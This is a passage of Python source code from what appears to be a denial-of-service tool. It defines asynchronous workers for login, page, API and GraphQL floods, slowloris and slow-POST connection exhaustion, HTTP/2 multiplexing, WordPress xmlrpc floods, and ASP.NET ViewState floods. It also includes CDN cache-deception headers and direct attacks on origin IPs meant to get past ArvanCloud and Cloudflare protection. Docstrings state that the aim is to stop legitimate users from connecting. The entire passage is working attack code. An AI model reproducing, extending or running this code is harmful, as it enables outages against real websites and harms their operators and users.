                        self._viewstate_ts = 0  # Force immediate refresh
                    result = HitResult(ok=resp.status < 500, code=resp.status, rt=elapsed,
                                      mode="login", hint=f"Login {resp.status}", url=self.url)
                    await self.live_log.add("login", resp.status, elapsed, None, self.url, result.hint)
                    self.health_monitor.record(result)
            except asyncio.TimeoutError:
                result = HitResult(ok=False, code=None, rt=time.time()-t, mode="login", err="Timeout")
                await self.live_log.add("login", None, result.rt, "Timeout", self.url)
                self.health_monitor.record(result)
            except Exception as e:
                msg = type(e).__name__
                result = HitResult(ok=False, code=None, rt=time.time()-t, mode="login", err=msg)
                await self.live_log.add("login", None, result.rt, msg, self.url)
                self.health_monitor.record(result)

            self._record(result)
            if not result.ok:
                consecutive_fails += 1
                await asyncio.sleep(min(0.01 * (2 ** min(consecutive_fails, 8)), 30.0))
            else:
                consecutive_fails = 0
                await asyncio.sleep(self.request_delay_ms / 1000)

    async def _worker_page(self, session, pages, delay=0):
        if delay > 0: await asyncio.sleep(delay)
        if not pages: pages = [self.url]
        consecutive_fails = 0
        while not self._stop.is_set():
            url = random.choice(pages)
            t = time.time()
            try:
                busted = f"{url}{'&' if '?' in url else '?'}{rand_cache_bust()}" if self.enable_cache_bust else url
                async with session.get(busted, headers=self._base_headers(),
                                       ssl=False, allow_redirects=True) as resp:
                    body = await resp.text()
                    elapsed = time.time() - t
                    result = HitResult(ok=resp.status < 500, code=resp.status, rt=elapsed,
                                      mode="page", hint=f"Page {resp.status} ({len(body):,}B)", url=url)
                    await self.live_log.add("page", resp.status, elapsed, None, url, result.hint)
                    self.health_monitor.record(result)
            except asyncio.TimeoutError:
                result = HitResult(ok=False, code=None, rt=time.time()-t, mode="page", err="Timeout", url=url)
                await self.live_log.add("page", None, result.rt, "Timeout", url)
                self.health_monitor.record(result)
            except Exception as e:
                result = HitResult(ok=False, code=None, rt=time.time()-t, mode="page", err=type(e).__name__, url=url)
                await self.live_log.add("page", None, result.rt, type(e).__name__, url)
                self.health_monitor.record(result)
            self._record(result)
            if not result.ok:
                consecutive_fails += 1
                await asyncio.sleep(min(0.01 * (2 ** min(consecutive_fails, 8)), 30.0))
            else:
                consecutive_fails = 0
                await asyncio.sleep(self.request_delay_ms / 1000)

    async def _worker_resource(self, session, resources, delay=0):
        if delay > 0: await asyncio.sleep(delay)
        if not resources: return
        consecutive_fails = 0
        while not self._stop.is_set():
            urls = random.sample(resources, min(3, len(resources)))
            for url in urls:
                if self._stop.is_set(): break
                t = time.time()
                try:
                    busted = f"{url}{'&' if '?' in url else '?'}{rand_cache_bust()}" if self.enable_cache_bust else url
                    headers = {"User-Agent": random_ua(), "Accept": "*/*", "Connection": "keep-alive"}
                    async with session.get(busted, headers=headers, ssl=False) as resp:
                        data = await resp.read()
                        elapsed = time.time() - t
                        result = HitResult(ok=resp.status < 500, code=resp.status, rt=elapsed,
                                          mode="resource", hint=f"Res {resp.status} ({len(data):,}B)", url=url)
                        await self.live_log.add("resource", resp.status, elapsed, None, url, result.hint)
                        self.health_monitor.record(result)
                except Exception as e:
                    result = HitResult(ok=False, code=None, rt=time.time()-t, mode="resource", err=type(e).__name__, url=url)
                    await self.live_log.add("resource", None, result.rt, type(e).__name__, url)
                    self.health_monitor.record(result)
                self._record(result)
            if not result.ok:
                consecutive_fails += 1
                await asyncio.sleep(min(0.01 * (2 ** min(consecutive_fails, 6)), 20.0))
            else:
                consecutive_fails = 0
            await asyncio.sleep(self.request_delay_ms / 1000)

    async def _worker_slowloris(self, session, delay=0):
        if delay > 0: await asyncio.sleep(delay)
        while not self._stop.is_set():
            t = time.time()
            try:
                headers = self._base_headers()
                headers["Content-Length"] = str(random.randint(10000, 100000))
                async with session.get(self.url, headers=headers, ssl=False,
                                       timeout=aiohttp.ClientTimeout(total=30),
                                       allow_redirects=False) as resp:
                    await asyncio.sleep(random.uniform(5, 15))
                    elapsed = time.time() - t
                    result = HitResult(ok=True, code=resp.status, rt=elapsed, mode="slowloris",
                                      hint=f"Slowloris {elapsed:.1f}s", url=self.url)
                    await self.live_log.add("slowloris", resp.status, elapsed, None, self.url, result.hint)
            except asyncio.TimeoutError:
                elapsed = time.time() - t
                result = HitResult(ok=True, code=None, rt=elapsed, mode="slowloris",
                                  hint=f"Slowloris timeout {elapsed:.1f}s", url=self.url)
                await self.live_log.add("slowloris", None, elapsed, None, self.url, "timeout")
            except Exception as e:
                result = HitResult(ok=False, code=None, rt=time.time()-t, mode="slowloris", err=type(e).__name__)
                await self.live_log.add("slowloris", None, result.rt, type(e).__name__, self.url)
            self.health_monitor.record(result)
            self._record(result)

    async def _worker_api(self, session, endpoints, delay=0):
        """API endpoint flooding worker"""
        if delay > 0: await asyncio.sleep(delay)
        if not endpoints: return
        consecutive_fails = 0
        while not self._stop.is_set():
            endpoint = random.choice(endpoints)
            url = endpoint if endpoint.startswith('http') else f"{self.site_root}{endpoint}"
            t = time.time()
            try:
                busted = f"{url}{'&' if '?' in url else '?'}{rand_cache_bust()}" if self.enable_cache_bust else url
                headers = {**self._base_headers(), "Accept": "application/json"}
                # Randomly choose GET or POST
                if random.random() > 0.6:
                    payload = json.dumps({"data": rand_user(), "id": random.randint(1, 99999)})
                    headers["Content-Type"] = "application/json"
                    async with session.post(busted, headers=headers, data=payload,
                                           ssl=False, allow_redirects=False) as resp:
                        elapsed = time.time() - t
                        result = HitResult(ok=resp.status < 500, code=resp.status, rt=elapsed,
                                          mode="api", hint=f"API POST {resp.status}", url=url)
                        await self.live_log.add("api", resp.status, elapsed, None, url, result.hint)
                else:
                    async with session.get(busted, headers=headers,
                                           ssl=False, allow_redirects=True) as resp:
                        elapsed = time.time() - t
                        result = HitResult(ok=resp.status < 500, code=resp.status, rt=elapsed,
                                          mode="api", hint=f"API GET {resp.status}", url=url)
                        await self.live_log.add("api", resp.status, elapsed, None, url, result.hint)
                self.health_monitor.record(result)
            except Exception as e:
                result = HitResult(ok=False, code=None, rt=time.time()-t, mode="api", err=type(e).__name__, url=url)
                await self.live_log.add("api", None, result.rt, type(e).__name__, url)
                self.health_monitor.record(result)
            self._record(result)
            if not result.ok:
                consecutive_fails += 1
                await asyncio.sleep(min(0.01 * (2 ** min(consecutive_fails, 6)), 20.0))
            else:
                consecutive_fails = 0
                await asyncio.sleep(self.request_delay_ms / 1000)

    # ─── SPA-Specific Attack Workers ──────────────────────────────────────────

    async def _worker_graphql(self, session, endpoint, delay=0):
        """GraphQL-specific flooding worker — sends complex nested queries"""
        if delay > 0: await asyncio.sleep(delay)
        if not endpoint: return
        consecutive_fails = 0

        # GraphQL query templates — from simple to deeply nested
        graphql_queries = [
            '{"query":"{ __schema { types { name fields { name type { name } } } } }"}',
            '{"query":"{ users { id name email posts { id title comments { id body author { id name } } } } }"}',
            '{"query":"{ products { id name price reviews { id rating body author { id name } } category { id name products { id } } } }"}',
            f'{{"query":"{{ search(query:\\"{rand_user()}\\") {{ id title description content {{ ... on User {{ email posts {{ id }} }} ... on Post {{ body author {{ name }} }} }} }} }}"}}',
            f'{{"query":"mutation {{ createPost(input: {{ title:\\"{rand_user()}\\", body:\\"{rand_pass()}\\", authorId:{random.randint(1,999)} }}) {{ id title }} }}"}}',
        ]

        while not self._stop.is_set():
            t = time.time()
            try:
                query = random.choice(graphql_queries)
                headers = {**self._base_headers(),
                          "Content-Type": "application/json",
                          "Accept": "application/json"}
                busted = f"{endpoint}{'&' if '?' in endpoint else '?'}{rand_cache_bust()}"
                async with session.post(busted, headers=headers, data=query,
                                       ssl=False, allow_redirects=False) as resp:
                    elapsed = time.time() - t
                    result = HitResult(ok=resp.status < 500, code=resp.status, rt=elapsed,
                                      mode="api", hint=f"GQL {resp.status}", url=endpoint)
                    await self.live_log.add("api", resp.status, elapsed, None, endpoint, result.hint)
                    self.health_monitor.record(result)
            except Exception as e:
                result = HitResult(ok=False, code=None, rt=time.time()-t, mode="api",
                                  err=type(e).__name__, url=endpoint)
                await self.live_log.add("api", None, result.rt, type(e).__name__, endpoint)
                self.health_monitor.record(result)
            self._record(result)
            if not result.ok:
                consecutive_fails += 1
                await asyncio.sleep(min(0.01 * (2 ** min(consecutive_fails, 6)), 20.0))
            else:
                consecutive_fails = 0
                await asyncio.sleep(self.request_delay_ms / 1000)

    async def _worker_spa_route(self, session, routes, delay=0):
        """SPA Route Flood — hits client-side routes that trigger API calls"""
        if delay > 0: await asyncio.sleep(delay)
        if not routes: routes = [self.url]
        consecutive_fails = 0

        while not self._stop.is_set():
            route = random.choice(routes)
            url = route if route.startswith('http') else f"{self.site_root}{route}"
            t = time.time()
            try:
                api_url = f"{url}{'&' if '?' in url else '?'}{rand_cache_bust()}" if self.enable_cache_bust else url
                headers = {**self._base_headers(),
                          "Accept": "application/json, text/plain, */*",
                          "X-Requested-With": "XMLHttpRequest"}
                async with session.get(api_url, headers=headers,
                                       ssl=False, allow_redirects=True) as resp:
                    body = await resp.text()
                    elapsed = time.time() - t
                    result = HitResult(ok=resp.status < 500, code=resp.status, rt=elapsed,
                                      mode="page", hint=f"SPA {resp.status} ({len(body):,}B)", url=url)
                    await self.live_log.add("page", resp.status, elapsed, None, url, result.hint)
                    self.health_monitor.record(result)
            except Exception as e:
                result = HitResult(ok=False, code=None, rt=time.time()-t, mode="page",
                                  err=type(e).__name__, url=url)
                await self.live_log.add("page", None, result.rt, type(e).__name__, url)
                self.health_monitor.record(result)
            self._record(result)
            if not result.ok:
                consecutive_fails += 1
                await asyncio.sleep(min(0.01 * (2 ** min(consecutive_fails, 6)), 20.0))
            else:
                consecutive_fails = 0
                await asyncio.sleep(self.request_delay_ms / 1000)

    async def _worker_ssr_render(self, session, routes, delay=0):
        """SSR Render Flood — forces server-side rendering on Next.js/SSR pages"""
        if delay > 0: await asyncio.sleep(delay)
        if not routes: routes = [self.url]
        consecutive_fails = 0

        while not self._stop.is_set():
            route = random.choice(routes)
            url = route if route.startswith('http') else f"{self.site_root}{route}"
            t = time.time()
            try:
                busted = f"{url}{'&' if '?' in url else '?'}{rand_cache_bust()}" if self.enable_cache_bust else url
                headers = {**self._base_headers(),
                          "Accept": "text/html,application/xhtml+xml",
                          "Cache-Control": "no-cache, no-store, must-revalidate",
                          "Pragma": "no-cache"}
                async with session.get(busted, headers=headers,
                                       ssl=False, allow_redirects=True) as resp:
                    body = await resp.text()
                    elapsed = time.time() - t
                    result = HitResult(ok=resp.status < 500, code=resp.status, rt=elapsed,
                                      mode="page", hint=f"SSR {resp.status} ({len(body):,}B)", url=url)
                    await self.live_log.add("page", resp.status, elapsed, None, url, result.hint)
                    self.health_monitor.record(result)
            except Exception as e:
                result = HitResult(ok=False, code=None, rt=time.time()-t, mode="page",
                                  err=type(e).__name__, url=url)
                await self.live_log.add("page", None, result.rt, type(e).__name__, url)
                self.health_monitor.record(result)
            self._record(result)
            if not result.ok:
                consecutive_fails += 1
                await asyncio.sleep(min(0.01 * (2 ** min(consecutive_fails, 6)), 20.0))
            else:
                consecutive_fails = 0
                await asyncio.sleep(self.request_delay_ms / 1000)

    async def _worker_viewstate(self, session, delay=0):
        """ASP.NET ViewState flooding worker — sends POST requests with fresh ViewState"""
        if delay > 0: await asyncio.sleep(delay)
        consecutive_fails = 0
        while not self._stop.is_set():
            t = time.time()
            try:
                hidden_fields = await self._refresh_viewstate(session)
                # Send POST with ViewState but random data
                form_data = {**hidden_fields,
                            self.username_field: rand_user(),
                            self.password_field: rand_pass(),
                            "__EVENTTARGET": "",
                            "__EVENTARGUMENT": "",}
                headers = {**self._base_headers(),
                          "Content-Type": "application/x-www-form-urlencoded",
                          "Origin": self.site_root, "Referer": self.url}
                async with session.post(self.url, headers=headers, data=form_data,
                                       ssl=False, allow_redirects=False) as resp:
                    body = await resp.text()
                    elapsed = time.time() - t
                    # Detect "invalid" in response — force ViewState refresh
                    if "invalid" in body.lower():
                        self._invalid_count += 1
                        self._viewstate_ts = 0  # Force immediate refresh
                    vs_size = len(hidden_fields.get('__VIEWSTATE', ''))
                    result = HitResult(ok=resp.status < 500, code=resp.status, rt=elapsed,
                                      mode="viewstate", hint=f"VS {resp.status} ({vs_size}B)", url=self.url)
                    await self.live_log.add("viewstate", resp.status, elapsed, None, self.url, result.hint)
                    self.health_monitor.record(result)
            except Exception as e:
                result = HitResult(ok=False, code=None, rt=time.time()-t, mode="viewstate", err=type(e).__name__)
                await self.live_log.add("viewstate", None, result.rt, type(e).__name__, self.url)
                self.health_monitor.record(result)
            self._record(result)
            if not result.ok:
                consecutive_fails += 1
                await asyncio.sleep(min(0.01 * (2 ** min(consecutive_fails, 8)), 30.0))
            else:
                consecutive_fails = 0
                await asyncio.sleep(self.request_delay_ms / 1000)

    async def _worker_wp(self, session, wp_config, delay=0):
        """WordPress-specific attack worker (xmlrpc + wp-login)"""
        if delay > 0: await asyncio.sleep(delay)
        consecutive_fails = 0
        login_url = wp_config.get("login_url", f"{self.site_root}/wp-login.php")
        xmlrpc_url = wp_config.get("xmlrpc_url", f"{self.site_root}/xmlrpc.php")

        while not self._stop.is_set():
            t = time.time()
            try:
                if random.random() > 0.5:
                    # wp-login.php flood
                    form_data = {
                        "log": rand_user(),
                        "pwd": rand_pass(),
                        "wp-submit": "Log In",
                        "redirect_to": "/wp-admin/",
                        "testcookie": "1",
                    }
                    headers = {**self._base_headers(),
                              "Content-Type": "application/x-www-form-urlencoded",
                              "Referer": login_url, "Origin": self.site_root}
                    async with session.post(login_url, headers=headers, data=form_data,
                                           ssl=False, allow_redirects=False) as resp:
                        elapsed = time.time() - t
                        result = HitResult(ok=resp.status < 500, code=resp.status, rt=elapsed,
                                          mode="wp", hint=f"WP-Login {resp.status}", url=login_url)
                        await self.live_log.add("wp", resp.status, elapsed, None, login_url, result.hint)
                else:
                    # xmlrpc.php flood
                    xml = f"""<?xml version="1.0"?>
                    <methodCall><methodName>wp.getUsersBlogs</methodName>
                    <params><param><value>{rand_user()}</value></param>
                    <param><value>{rand_pass()}</value></param></params></methodCall>"""
                    headers = {**self._base_headers(), "Content-Type": "text/xml"}
                    async with session.post(xmlrpc_url, headers=headers, data=xml,
                                           ssl=False, allow_redirects=False) as resp:
                        elapsed = time.time() - t
                        result = HitResult(ok=resp.status < 500, code=resp.status, rt=elapsed,
                                          mode="wp", hint=f"XMLRPC {resp.status}", url=xmlrpc_url)
                        await self.live_log.add("wp", resp.status, elapsed, None, xmlrpc_url, result.hint)
                self.health_monitor.record(result)
            except Exception as e:
                result = HitResult(ok=False, code=None, rt=time.time()-t, mode="wp", err=type(e).__name__)
                await self.live_log.add("wp", None, result.rt, type(e).__name__, self.url)
                self.health_monitor.record(result)
            self._record(result)
            if not result.ok:
                consecutive_fails += 1
                await asyncio.sleep(min(0.01 * (2 ** min(consecutive_fails, 6)), 20.0))
            else:
                consecutive_fails = 0
                await asyncio.sleep(self.request_delay_ms / 1000)

    # ─── ArvanCloud/CDN-Specific Attack Workers ───────────────────────────────

    async def _worker_slow_post_read(self, session, delay=0):
        """Slow POST/READ Attack — exhaust CDN connection pool.
        
        Sends POST request body byte-by-byte with long delays between chunks.
        CDN has limited connection pool — each slow request ties up a connection.
        When pool is exhausted, legitimate users can't connect.
        Effective against ArvanCloud, Cloudflare, and similar CDNs.
        """
        if delay > 0: await asyncio.sleep(delay)
        while not self._stop.is_set():
            t = time.time()
            try:
                # Generate a large body that we'll send slowly
                body_size = random.randint(50000, 500000)
                headers = {**self._base_headers(),
                          "Content-Type": "application/x-www-form-urlencoded",
                          "Content-Length": str(body_size),
                          "Connection": "keep-alive",
                          "Origin": self.site_root, "Referer": self.url}
                
                # Create connection and send headers + body slowly
                timeout = aiohttp.ClientTimeout(total=120, sock_read=60)
                async with session.post(self.url, headers=headers, data=self._slow_body(body_size),
                                       ssl=False, timeout=timeout,
                                       allow_redirects=False) as resp:
                    elapsed = time.time() - t
                    result = HitResult(ok=resp.status < 500, code=resp.status, rt=elapsed,
                                      mode="slowpost", hint=f"SlowPOST {resp.status} {elapsed:.1f}s",
                                      url=self.url)
                    await self.live_log.add("slowpost", resp.status, elapsed, None, self.url, result.hint)
                    self.health_monitor.record(result)
            except asyncio.TimeoutError:
                elapsed = time.time() - t
                result = HitResult(ok=True, code=None, rt=elapsed, mode="slowpost",
                                  hint=f"SlowPOST timeout {elapsed:.1f}s", url=self.url)
                await self.live_log.add("slowpost", None, elapsed, None, self.url, "timeout")
                self.health_monitor.record(result)
            except Exception as e:
                result = HitResult(ok=False, code=None, rt=time.time()-t, mode="slowpost",
                                  err=type(e).__name__, url=self.url)
                await self.live_log.add("slowpost", None, result.rt, type(e).__name__, self.url)
                self.health_monitor.record(result)
            self._record(result)

    async def _slow_body(self, size: int):
        """Async generator that yields body bytes slowly for Slow POST attack."""
        chunk_size = random.randint(1, 5)  # 1-5 bytes at a time
        sent = 0
        filler = "A" * chunk_size
        while sent < size and not self._stop.is_set():
            remaining = size - sent
            yield filler[:min(chunk_size, remaining)].encode()
            sent += min(chunk_size, remaining)
            # Random delay between chunks (0.1-2 seconds) to hold connection open
            await asyncio.sleep(random.uniform(0.1, 2.0))

    async def _worker_h2_multiplex(self, session, delay=0):
        """HTTP/2 Multiplexing Attack — bypass CDN rate limiting.
        
        Uses httpx with HTTP/2 support to open a single TCP connection
        and send many concurrent streams. Most CDNs rate-limit per TCP
        connection or per IP, but HTTP/2 multiplexing allows hundreds
        of concurrent requests on one connection, bypassing per-connection limits.
        """
        if delay > 0: await asyncio.sleep(delay)
        if not HAS_HTTPX:
            return
        
        while not self._stop.is_set():
            t = time.time()
            try:
                # Use httpx for HTTP/2 support
                async with httpx.AsyncClient(http2=True, verify=False,
                                             timeout=httpx.Timeout(30.0)) as client:
                    # Send multiple concurrent requests on single H2 connection
                    num_streams = random.randint(10, 50)
                    tasks = []
                    for i in range(num_streams):
                        if self._stop.is_set(): break
                        url = self.url
                        if self.enable_cache_bust:
                            url = f"{url}{'&' if '?' in url else '?'}{rand_cache_bust()}"
                        headers = {
                            "User-Agent": random_ua(),
                            "Accept": "text/html,*/*",
                            "Accept-Language": "en-US,en;q=0.9",
                            "Referer": self.url,
                        }
                        if i % 3 == 0:
                            # Mix in some POST requests
                            payload = json.dumps({"data": rand_user(), "t": random.randint(1, 99999)})
                            headers["Content-Type"] = "application/json"
                            tasks.append(client.post(url, headers=headers, content=payload))
                        else:
                            tasks.append(client.get(url, headers=headers))
                    
                    # Execute all streams concurrently
                    results = await asyncio.gather(*tasks, return_exceptions=True)
                    elapsed = time.time() - t
                    
                    success_count = 0
                    for r in results:
                        if isinstance(r, httpx.Response):
                            if r.status_code < 500:
                                success_count += 1
                    
                    result = HitResult(ok=success_count > 0, code=200 if success_count > 0 else None,
                                      rt=elapsed, mode="h2mux",
                                      hint=f"H2 {success_count}/{num_streams} ok {elapsed:.1f}s",
                                      url=self.url)
                    await self.live_log.add("h2mux", 200 if success_count > 0 else None,
                                           elapsed, None, self.url, result.hint)
                    self.health_monitor.record(result)
            except Exception as e:
                result = HitResult(ok=False, code=None, rt=time.time()-t, mode="h2mux",
                                  err=type(e).__name__, url=self.url)
                await self.live_log.add("h2mux", None, result.rt, type(e).__name__, self.url)
                self.health_monitor.record(result)
            self._record(result)

    async def _worker_cache_deception(self, session, delay=0):
        """Cache Deception/Bypass Attack — force CDN to hit origin every time.
        
        Sends requests with special headers that prevent CDN from caching
        responses. Each request must be processed by the origin server,
        multiplying the actual server load. Effective against ArvanCloud
        and other CDNs with aggressive caching.
        
        Techniques used:
        - Cache-Control headers requesting no-cache
        - Vary header manipulation
        - Accept-Encoding tricks
        - URL path tricks with non-cachable extensions
        - Query string manipulation
        """
        if delay > 0: await asyncio.sleep(delay)
        consecutive_fails = 0
        while not self._stop.is_set():
            t = time.time()
            try:
                # Cache deception header combinations
                cache_headers_list = [
                    # Force origin bypass
                    {**self._base_headers(),
                     "Cache-Control": "no-cache, no-store, must-revalidate",
                     "Pragma": "no-cache",
                     "X-Arvan-Cache": "bypass",
                     "X-Cache-Bypass": "1"},
                    # Vary manipulation
                    {**self._base_headers(),
                     "Accept-Encoding": "identity",
                     "Vary": "*",
                     "X-Forwarded-Proto": "https"},
                    # Range header (non-cacheable)
                    {**self._base_headers(),
                     "Range": "bytes=0-1",
                     "If-Modified-Since": "Thu, 01 Jan 1970 00:00:00 GMT",
                     "Cache-Control": "max-age=0"},
                    # Cookie-based bypass
                    {**self._base_headers(),
                     "Cookie": f"nocache={rand_user()}; session={rand_user()}",
                     "X-Requested-With": "XMLHttpRequest",
                     "Accept": "application/json"},
                    # Path trick with non-cacheable extension
                    {**self._base_headers(),
                     "Accept": "text/html,*/*",
                     "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}",
                     "X-Real-IP": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"},
                ]
                
                headers = random.choice(cache_headers_list)
                
                # URL tricks to defeat caching
                url = self.url
                trick = random.random()
                if trick < 0.3:
                    # Add fake extension to make CDN think it's non-cacheable
                    url = f"{url}{'/' if not url.endswith('/') else ''}.json"
                elif trick < 0.6:
                    # Add random query params
                    url = f"{url}{'&' if '?' in url else '?'}nocache={rand_user()}&t={int(time.time())}"
                else:
                    # Standard cache bust
                    url = f"{url}{'&' if '?' in url else '?'}{rand_cache_bust()}"
                
                async with session.get(url, headers=headers,
                                       ssl=False, allow_redirects=False) as resp:
                    body = await resp.text()
                    elapsed = time.time() - t
                    
                    # Check if CDN cache was bypassed
                    cache_status = resp.headers.get('X-Cache', resp.headers.get('CF-Cache-Status', ''))
                    bypassed = any(x in cache_status.lower() for x in ['miss', 'bypass', 'dynamic', 'expired'])
                    hint = f"CD {resp.status}"
                    if bypassed:
                        hint += " BYPASS"
                    elif cache_status:
                        hint += f" {cache_status}"
                    
                    result = HitResult(ok=resp.status < 500, code=resp.status, rt=elapsed,
                                      mode="cachedec", hint=hint, url=url)
                    await self.live_log.add("cachedec", resp.status, elapsed, None, url, hint)
                    self.health_monitor.record(result)
            except asyncio.TimeoutError:
                result = HitResult(ok=False, code=None, rt=time.time()-t, mode="cachedec",
                                  err="Timeout", url=self.url)
                await self.live_log.add("cachedec", None, result.rt, "Timeout", self.url)
                self.health_monitor.record(result)
            except Exception as e:
                result = HitResult(ok=False, code=None, rt=time.time()-t, mode="cachedec",
                                  err=type(e).__name__, url=self.url)
                await self.live_log.add("cachedec", None, result.rt, type(e).__name__, self.url)
                self.health_monitor.record(result)
            self._record(result)
            if not result.ok:
                consecutive_fails += 1
                await asyncio.sleep(min(0.01 * (2 ** min(consecutive_fails, 6)), 20.0))
            else:
                consecutive_fails = 0
                await asyncio.sleep(self.request_delay_ms / 1000)

    async def _worker_origin_direct(self, session, delay=0):
        """Origin IP Direct Attack — bypass CDN entirely by hitting the real server.
        
        When VF_FINDER discovers the origin IP behind a CDN (ArvanCloud, Cloudflare),
        this worker sends requests directly to the origin IP with the correct Host
        header. The CDN is completely bypassed, so rate limiting and WAF rules
        don't apply. This is the most effective attack against CDN-protected sites.
        """
        if delay > 0: await asyncio.sleep(delay)
        if not self.origin_ips:
            return
        
        consecutive_fails = 0
        while not self._stop.is_set():
            # Pick a random origin IP
            origin_ip = random.choice(self.origin_ips)
            # Determine scheme (try HTTPS first if original was HTTPS)
            scheme = self.profile.get("scheme", "https")
            port = self.profile.get("port", 443 if scheme == "https" else 80)
            
            t = time.time()
            try:
                # Build direct-to-origin URL
                direct_url = f"{scheme}://{origin_ip}{self.profile.get('path', '/')}"
                # Randomly add cache bust
                if self.enable_cache_bust:
                    direct_url = f"{direct_url}{'&' if '?' in direct_url else '?'}{rand_cache_bust()}"
                
                # Critical: Send the real domain as Host header so the origin serves the site
                headers = {
                    "Host": self.domain,
                    "User-Agent": random_ua(),
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                    "Accept-Language": "en-US,en;q=0.9",
                    "Accept-Encoding": "gzip, deflate, br",
                    "Connection": "keep-alive",
                    "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}",
                    "X-Real-IP": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}",
                    "X-Forwarded-Host": self.domain,
                    "X-Forwarded-Proto": scheme,
                }
                
                # Randomly choose attack type
                r = random.random()
                if r < 0.4:
                    # Login flood directly to origin
                    form_data = {
                        self.username_field: rand_user(),
                        self.password_field: rand_pass()
                    }
                    headers["Content-Type"] = "application/x-www-form-urlencoded"
                    headers["Origin"] = self.site_root
                    headers["Referer"] = self.url
                    async with session.post(direct_url, headers=headers, data=form_data,
                                           ssl=False, allow_redirects=False) as resp:
                        body = await resp.text()
                        elapsed = time.time() - t
                        result = HitResult(ok=resp.status < 500, code=resp.status, rt=elapsed,
                                          mode="login", hint=f"ORIGIN {resp.status} (direct)", url=direct_url)
                        await self.live_log.add("login", resp.status, elapsed, None, direct_url, result.hint)
                elif r < 0.7:
                    # Page flood directly to origin
                    async with session.get(direct_url, headers=headers, ssl=False,
                                           allow_redirects=False) as resp:
                        body = await resp.text()
                        elapsed = time.time() - t
                        result = HitResult(ok=resp.status < 500, code=resp.status, rt=elapsed,
                                          mode="page", hint=f"ORIGIN {resp.status} ({len(body):,}B)", url=direct_url)
                        await self.live_log.add("page", resp.status, elapsed, None, direct_url, result.hint)
                else:
                    # Slow POST directly to origin — most devastating
                    body_size = random.randint(50000, 200000)
                    headers["Content-Type"] = "application/x-www-form-urlencoded"
                    headers["Content-Length"] = str(body_size)
                    headers["Origin"] = self.site_root
                    headers["Referer"] = self.url
                    timeout = aiohttp.ClientTimeout(total=60, sock_read=30)
                    async with session.post(direct_url, headers=headers, data=self._slow_body(body_size),
                                           ssl=False, timeout=timeout,
                                           allow_redirects=False) as resp:
                        elapsed = time.time() - t
                        result = HitResult(ok=resp.status < 500, code=resp.status, rt=elapsed,
                                          mode="slowpost", hint=f"ORIGIN-SPST {resp.status} {elapsed:.1f}s",
                                          url=direct_url)
                        await self.live_log.add("slowpost", resp.status, elapsed, None, direct_url, result.hint)
                
                self.health_monitor.record(result)
            except asyncio.TimeoutError:
                elapsed = time.time() - t
                result = HitResult(ok=True, code=None, rt=elapsed, mode="slowpost",
                                  hint=f"ORIGIN timeout {elapsed:.1f}s", url=direct_url)
                await self.live_log.add("slowpost", None, elapsed, None, direct_url, "timeout")
                self.health_monitor.record(result)
            except Exception as e:
                result = HitResult(ok=False, code=None, rt=time.time()-t, mode="page",
                                  err=type(e).__name__, url=direct_url)
                await self.live_log.add("page", None, result.rt, type(e).__name__, direct_url)
                self.health_monitor.record(result)
            
            self._record(result)
            if not result.ok:
                consecutive_fails += 1
                await asyncio.sleep(min(0.01 * (2 ** min(consecutive_fails, 6)), 20.0))
            else:
                consecutive_fails = 0
                await asyncio.sleep(self.request_delay_ms / 1000)

    def _record(self, r: HitResult):
        self.stats.total += 1
        self.stats.rts.append(r.rt)
        self.stats._recent.append(r)
        if r.ok: self.stats.ok += 1
        else: self.stats.fail += 1
        if r.code: self.stats.codes[r.code] = self.stats.codes.get(r.code, 0) + 1
        
        # v5: Feed response to AdaptiveBypass for WAF blocking detection
        if self.detected_waf and r.code:
            is_blocked = self.adaptive_bypass.record_response(r.code)
            if is_blocked:
                self.stats.rate_limited += 1
        
        if r.mode == "login":
            if r.ok:
                self.stats.login_ok += 1
            else:
                self.stats.login_fail += 1
        elif r.mode == "page": self.stats.page_hits += 1
        elif r.mode == "resource": self.stats.resource_hits += 1
        elif r.mode == "slowloris": self.stats.slowloris_hits += 1
        elif r.mode == "api": self.stats.api_hits += 1
        elif r.mode == "viewstate": self.stats.viewstate_hits += 1
        elif r.mode == "wp": self.stats.wp_hits += 1
        elif r.mode == "slowpost": self.stats.slowpost_hits += 1
        elif r.mode == "h2mux": self.stats.h2mux_hits += 1
        elif r.mode == "cachedec": self.stats.cachedec_hits += 1

    async def _persistent_worker(self, session, vectors, pages, resources, delay=0):
        """Persistent worker wrapper — respawns inner workers when they die"""
        if delay > 0: await asyncio.sleep(delay)
        while not self._stop.is_set():
            try:
                # Pick a random worker type and run it once (single cycle)
                # Instead of infinite loop, each worker type does one request
                r = random.random()
                is_spa = self.attack.get("spa_config", {}).get("enabled", False)
                
                if is_spa:
                    weights = self.attack.get("spa_config", {}).get("worker_weights", {})
                    login_pct = weights.get("login_pct", 0.05)
                    page_pct = 0
                    resource_pct = weights.get("resource_pct", 0.05)
                    slowloris_pct = weights.get("slowloris_pct", 0.05)
                    api_pct = weights.get("api_pct", 0.40)
                    graphql_pct = weights.get("graphql_pct", 0.20)
                    spa_route_pct = weights.get("spa_route_pct", 0.15)
                    ssr_render_pct = weights.get("ssr_render_pct", 0.10)
                    viewstate_pct = 0
                    wp_pct = 0
                    slowpost_pct = 0
                    h2mux_pct = 0
                    cachedec_pct = 0
                else:
                    # Check if CDN/WAF detected for ArvanCloud-specific attacks
                    is_cdn_target = bool(self.detected_waf) or bool(self.attack.get("waf_strategy", {}).get("detected"))
                    
                    login_pct = 0.30
                    page_pct = 0.15
                    resource_pct = 0.10
                    slowloris_pct = 0.05
                    api_pct = 0.05 if self.has_api else 0
                    graphql_pct = 0
                    spa_route_pct = 0
                    ssr_render_pct = 0
                    viewstate_pct = 0.10 if self.is_aspnet else 0
                    wp_pct = 0.10 if self.is_wordpress else 0
                    origin_direct_pct = 0  # Default: off
                    
                    # CDN-specific attacks — activated when WAF/CDN detected
                    if is_cdn_target:
                        slowpost_pct = 0.10
                        h2mux_pct = 0.05 if HAS_HTTPX else 0
                        cachedec_pct = 0.10
                        # Reduce other percentages to make room
                        login_pct = 0.20
                        page_pct = 0.10
                        
                        # If origin IPs were found, prioritize direct attack!
